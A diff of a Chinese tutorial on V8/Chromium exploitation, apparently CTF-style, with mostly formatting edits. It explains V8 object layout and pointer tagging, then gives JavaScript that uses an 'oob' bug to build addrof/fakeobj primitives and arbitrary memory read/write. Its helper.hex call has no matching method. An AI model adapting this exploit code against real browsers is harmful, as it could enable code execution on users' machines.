@@ -39,8 +39,7 @@ title: V8 - PWN chromium 0x00
 > [!info]
 >
 > 1. JS 源码通过 **parser（分析器）转化为 AST（抽象语法树）**，再经过 **interpreter（解释器）解析为 bytecode（字节码）**
-> 2. 为了提高运行效率，**optimizing compiler（优化编辑器）负责生成 optimized code（优化后的机器码）**
-> ![V8-image03](static/V8-image03.png)
+> 2. 为了提高运行效率，**optimizing compiler（优化编辑器）负责生成 optimized code（优化后的机器码）** > ![V8-image03](static/V8-image03.png)
 
 可以把重点放在 AST 之后，其中优化的矛盾点在于：JS 代码可以在 **字节码** 或者优化后的 **机器码** 状态下执行，而生成字节码速度很 **快**，生成机器码就要 **慢** 一些。
 
@@ -80,8 +79,8 @@ V8 中的 JS 对象结构基本符合下面描述：
 - 测试代码：
 
 ```javascript
-let float_list = [4.3];
-%DebugPrint(float_list);
+let float_list = [4.3]
+%DebugPrint(float_list)
 ```
 
 - 输出：
@@ -218,7 +217,8 @@ source gdbinit_v8
 >
 > 即指针标记机制，用来区分指针、双精度数、SMI（immediate small integer）。
 
-> [!quote] 
+> [!quote]
+>
 > - **Double**: Shown as the 64-bit binary representation without any changes
 > - **Smi**: Represented as value << 32, i.e. `0xdeadbeef` is represented as `0xdeadbeef00000000`
 > - **Pointers**: Represented as $addr | 1$, i.e. `0x2233ad9c2ed8` is represented as `0x2233ad9c2ed9`
@@ -252,6 +252,7 @@ graph TD;
 有如下常见漏洞点：
 
 > [!quote]
+>
 > 1. JS code exectution:
 >    - Type Confusions
 >    - UaFs
@@ -315,59 +316,59 @@ ninja -C out.gn/x64.release d8
 
 ```javascript
 class Helpers {
-    constructor() {
-        this.buf = new ArrayBuffer(8);
-        this.f64 = new Float64Array(this.buf);
-        this.f32 = new Float32Array(this.buf);
-        this.u32 = new Uint32Array(this.buf);
-        this.u64 = new BigUint64Array(this.buf);
-        this.state = {};
-    }
+  constructor() {
+    this.buf = new ArrayBuffer(8)
+    this.f64 = new Float64Array(this.buf)
+    this.f32 = new Float32Array(this.buf)
+    this.u32 = new Uint32Array(this.buf)
+    this.u64 = new BigUint64Array(this.buf)
+    this.state = {}
+  }
 
-    ftoil(f) {
-        this.f64[0] = f;
-        return this.u32[0]
-    }
+  ftoil(f) {
+    this.f64[0] = f
+    return this.u32[0]
+  }
 
-    ftoih(f) {
-        this.f64[0] = f;
-        return this.u32[1]
-    }
+  ftoih(f) {
+    this.f64[0] = f
+    return this.u32[1]
+  }
 
-    itof(i) {
-        this.u32[0] = i;
-        return this.f32[0];
-    }
+  itof(i) {
+    this.u32[0] = i
+    return this.f32[0]
+  }
 
-    f64toi64(f) {
-        this.f64[0] = f;
-        return this.u64[0];
-    }
+  f64toi64(f) {
+    this.f64[0] = f
+    return this.u64[0]
+  }
 
-    i64tof64(i) {
-        this.u64[0] = i;
-        return this.f64[0];
-    }
+  i64tof64(i) {
+    this.u64[0] = i
+    return this.f64[0]
+  }
 
-    clean() {
-        this.state.fake_object.fill(0);
-    }
+  clean() {
+    this.state.fake_object.fill(0)
+  }
 
-    printhex(val) {
-        console.log('0x' + val.toString(16));
-    }
+  printhex(val) {
+    console.log("0x" + val.toString(16))
+  }
 
-    add_ref(object) {
-        this.state[this.i++] = object;
-    }
+  add_ref(object) {
+    this.state[this.i++] = object
+  }
 
-    gc() {
-        new ArrayBuffer(0x7fe00000);
-        new ArrayBuffer(0x7fe00000);
-        new ArrayBuffer(0x7fe00000);
-        new ArrayBuffer(0x7fe00000);
-        new ArrayBuffer(0x7fe00000);
-    }
+  gc() {
+    new ArrayBuffer(0x7fe00000)
+    new ArrayBuffer(0x7fe00000)
+    new ArrayBuffer(0x7fe00000)
+    new ArrayBuffer(0x7fe00000)
+    new ArrayBuffer(0x7fe00000)
+  }
 }
 ```
 
@@ -387,38 +388,38 @@ class Helpers {
 因此就可以构造出如下 poc：
 
 ```javascript
-let helper = new Helpers();
+let helper = new Helpers()
 
-console.log("STEP 0 - Leak maps with oob access.");
+console.log("STEP 0 - Leak maps with oob access.")
 
-let obj = {};
-let obj_list = [obj];
-let float_list = [4.3];
+let obj = {}
+let obj_list = [obj]
+let float_list = [4.3]
 
-%DebugPrint(obj_list);
-%DebugPrint(float_list);
+%DebugPrint(obj_list)
+%DebugPrint(float_list)
 
-let obj_list_map = obj_list.oob();
-let float_list_map = float_list.oob();
+let obj_list_map = obj_list.oob()
+let float_list_map = float_list.oob()
 
-%SystemBreak();
+%SystemBreak()
 
-console.log("STEP 1 - Type confusion.");
+console.log("STEP 1 - Type confusion.")
 
 function get_addr(victim) {
-  obj_list[0] = victim;
-  obj_list.oob(float_list_map);
-  let res = helper.f64toi64(obj_list[0]) - 1n;
-  obj_list.oob(obj_list_map);
-  return res;
+  obj_list[0] = victim
+  obj_list.oob(float_list_map)
+  let res = helper.f64toi64(obj_list[0]) - 1n
+  obj_list.oob(obj_list_map)
+  return res
 }
 
 function get_obj(addr) {
-  float_list[0] = helper.i64tof64(addr | 1n);
-  float_list.oob(obj_list_map);
-  let res = float_list[0];
-  float_list.oob(float_list_map);
-  return res;
+  float_list[0] = helper.i64tof64(addr | 1n)
+  float_list.oob(obj_list_map)
+  let res = float_list[0]
+  float_list.oob(float_list_map)
+  return res
 }
 
 let evil_float_array = [
@@ -428,33 +429,31 @@ let evil_float_array = [
   helper.i64tof64((0x80n << 32n) | 0n),
   helper.i64tof64(0xdeadcafen),
   helper.i64tof64(0x31337n),
-];
+]
 
-let fake_array_addr = get_addr(evil_float_array);
-let fake_elements_addr = fake_array_addr + 0x30n;
-let fake_obj = get_obj(fake_elements_addr);
+let fake_array_addr = get_addr(evil_float_array)
+let fake_elements_addr = fake_array_addr + 0x30n
+let fake_obj = get_obj(fake_elements_addr)
 
-%DebugPrint(evil_float_array);
-%DebugPrint(fake_obj);
-%SystemBreak();
+%DebugPrint(evil_float_array)
+%DebugPrint(fake_obj)
+%SystemBreak()
 ```
 
 可以验证在输出 `fake_obj` 时显示为 `<JSArray[128]>` 类型，进一步就可以在 `fake_obj` 的基础上获得任意地址读写的能力：
 
 ```javascript
-console.log("STEP 2 - Arbitary read and write with fake_obj.");
+console.log("STEP 2 - Arbitary read and write with fake_obj.")
 
 function arb_write(addr, data) {
-  evil_float_array[2] = helper.i64tof64((addr - 0x10n) | 1n);
-  fake_obj[0] = helper.i64tof64(data);
-  console.log(
-    "[DEBUG] Writing 0x" + helper.hex(data) + " to 0x" + helper.hex(addr),
-  );
+  evil_float_array[2] = helper.i64tof64((addr - 0x10n) | 1n)
+  fake_obj[0] = helper.i64tof64(data)
+  console.log("[DEBUG] Writing 0x" + helper.hex(data) + " to 0x" + helper.hex(addr))
 }
 
 function arb_read(addr) {
-  evil_float_array[2] = helper.i64tof64((addr - 0x10n) | 1n);
-  return helper.f64toi64(fake_obj[0]);
+  evil_float_array[2] = helper.i64tof64((addr - 0x10n) | 1n)
+  return helper.f64toi64(fake_obj[0])
 }
 ```
 
@@ -469,19 +468,18 @@ function arb_read(addr) {
 改进如下:
 
 ```javascript
-let data_buf = new ArrayBuffer(8);
-let data_view = new DataView(data_buf);
-let buf_backing_store_addr = get_addr(data_buf) + 0x20n;
+let data_buf = new ArrayBuffer(8)
+let data_view = new DataView(data_buf)
+let buf_backing_store_addr = get_addr(data_buf) + 0x20n
 
 function arb_write64(addr, data) {
-  arb_write(buf_backing_store_addr, addr);
-  data_view.setBigUint64(0, data, true);
-  console.log(
-    "[DEBUG] Writing 0x" + helper.hex(data) + " to 0x" + helper.hex(addr),
-  );
+  arb_write(buf_backing_store_addr, addr)
+  data_view.setBigUint64(0, data, true)
+  console.log("[DEBUG] Writing 0x" + helper.hex(data) + " to 0x" + helper.hex(addr))
 }
 ```
 
 现在获得了任意地址读写，最简单的方法就是
 
 [ref](https://cloud.tencent.com/developer/article/1764424)
+[ref - sandbox](https://tttang.com/archive/1443/)
